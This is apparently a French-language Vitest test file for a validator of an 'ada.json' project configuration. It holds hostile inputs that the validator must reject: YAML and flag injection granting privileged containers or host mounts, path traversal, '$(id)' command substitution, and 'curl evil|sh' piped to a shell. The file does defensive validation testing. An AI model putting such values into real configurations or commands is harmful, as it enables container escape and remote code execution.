import { describe, it, expect } from 'vitest';
import { ADA_PAR_DEFAUT, lireAdaConfig } from './ada-config.js';

describe('ada.json — description d’un modèle', () => {
  it('sans fichier : comportement des projets existants (Vue + NestJS + PostgreSQL)', () => {
    expect(lireAdaConfig(null)).toBe(ADA_PAR_DEFAUT);
    expect(ADA_PAR_DEFAUT.apercu.base).toBe('postgres');
  });

  it('lit une maquette sans base ni API, avec les valeurs par défaut', () => {
    const config = lireAdaConfig(
      JSON.stringify({
        type: 'maquette',
        controlesRequis: ['Maquette'],
        controles: ['cd /app && npm test'],
        apercu: { npm: ['.'], principal: 'cd /app && npx vite --host 0.0.0.0 --port 5173' },
      }),
    );
    expect(config).toMatchObject({ type: 'maquette', personnaliser: [], apercu: { base: null, image: 'node:24-bookworm', port: 5173, avant: [], arrierePlan: [] } });
  });

  it('refuse un ada.json incomplet, en disant quoi', () => {
    expect(() => lireAdaConfig(JSON.stringify({ type: 'fusee', apercu: {} }))).toThrow(/ada\.json invalide : .*type/);
  });

  describe('valeurs qui finissent dans compose.yml et dans les scripts', () => {
    const avec = (apercu: Record<string, unknown>) =>
      JSON.stringify({ type: 'maquette', controlesRequis: ['M'], controles: ['x'], apercu: { principal: 'npx vite', ...apercu } });

    it.each(['node:24-bookworm', 'python:3.13-slim', 'ghcr.io/org/image:1.2'])('accepte l’image %s', (image) => {
      expect(lireAdaConfig(avec({ image })).apercu.image).toBe(image);
    });

    it.each([
      'node:24\n    privileged: true',
      'node:24 --privileged',
      'node:24"\n    volumes: ["/:/hote"]',
      '../image',
      'Node:24',
      '',
    ])('refuse l’image %j', (image) => {
      expect(() => lireAdaConfig(avec({ image }))).toThrow(/ada\.json invalide : apercu\.image/);
    });

    it.each(['.', 'api', 'front', 'services/api', './front'])('accepte le dossier %s', (dossier) => {
      expect(lireAdaConfig(avec({ npm: [dossier], pip: [dossier] })).apercu.npm).toEqual([dossier]);
    });

    it.each(['..', '../hors', 'api/../../hors', '/etc', 'api; curl evil|sh', 'api\nautre', 'a b', '$(id)', 'api/', ''])(
      'refuse le dossier %j (npm comme pip)',
      (dossier) => {
        expect(() => lireAdaConfig(avec({ npm: [dossier] }))).toThrow(/apercu\.npm/);
        expect(() => lireAdaConfig(avec({ pip: [dossier] }))).toThrow(/apercu\.pip/);
      },
    );
  });
});
